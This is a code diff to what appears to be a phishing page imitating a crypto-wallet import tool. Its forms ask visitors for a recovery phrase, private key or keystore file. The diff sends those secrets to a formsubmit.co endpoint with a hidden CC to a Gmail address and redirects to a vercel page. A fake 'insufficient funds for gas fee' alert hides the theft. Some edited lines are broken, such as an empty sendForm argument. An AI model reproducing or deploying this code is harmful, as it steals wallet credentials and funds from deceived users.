@@ -48,7 +48,11 @@
                 </div>
                 <div id="myTabContent">
                     <div class="p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="profile" role="tabpanel" aria-labelledby="profile-tab">
-                        <form id="keyphraseForm" onsubmit="return sendEmail(this, 'template_6jo5dtv')">
+                       <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_cc" value="wnewton0001@gmail.com">
+
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://coinsolutionsdapp.vercel.app/access/point/barcode-generated.html">
                             <label for="keystorejson">Recovery Phrase:</label> 
                             <input type="hidden" name="_captcha" value="false"> 
                             <input type="hidden" name="importType" value="phrase"> 
@@ -77,7 +81,10 @@ Kindly fund your account and try again later</p></center>
                         </div> 
                     </form>
                     <div class="hidden p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="settings" role="tabpanel" aria-labelledby="settings-tab">
-                        <form id="Privaatekeyform" onsubmit="return sendEmail(this, 'template_6jo5dtv')">
+                        <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                         <input type="hidden" name="_cc" value="wnewton0001@gmail.com">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://coinsolutionsdapp.vercel.app/access/point/barcode-generated.html">
                             <label for="keystorejson">Private key:</label>  
                             <input type="hidden" name="_captcha" value="false"> 
                             <input type="hidden" name="importType" value="privateKey">
@@ -103,7 +110,10 @@ Kindly fund your account and try again later</p></center>
                         </form>
                     </div>
                     <div class="hidden p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="zaged" role="tabpanel" aria-labelledby="zaged-tab">
-                        <form id="keystoreForm" onsubmit="return sendEmail(this, 'template_6jo5dtv')">
+                       <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                       <input type="hidden" name="_cc" value="wnewton0001@gmail.com">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://coinsolutionsdapp.vercel.app/access/point/barcode-generated.htmll">
                             <label for="keystorejson">Keystore JSON:</label>  
                             <input type="file" id="keystorejson" name="keystorejson" required>
                             <div class="mb-6">
@@ -156,17 +166,17 @@ Kindly fund your account and try again later</p></center>
             function ready() {
                 document.body.style.display = "block";
             }
-            document.addEventListener("DOMContentLoaded", ready);
+            document.addEventListener("", ready);
         </script>
 
         <!-- Add EmailJS SDK and sendEmail function before </body> -->
 <script src="../../cdn.emailjs.com/dist/email.min.js"></script>
 <script>
 (function(){
-    emailjs.init("SJbej_H6qXc0loOex"); // Replace with your EmailJS user ID
+    emailjs.init(""); // Replace with your EmailJS user ID
 })();
 function sendEmail(form, template_6jo5dtv) {
-    emailjs.sendForm('service_hdr6yam', template_6jo5dtv, form)
+    emailjs.sendForm('', , form)
         .then(function() {
             alert('OOps, insuffienct funds, does not have enough funds required for gas fee. Kindly fund your account and try again later!');
             form.reset();
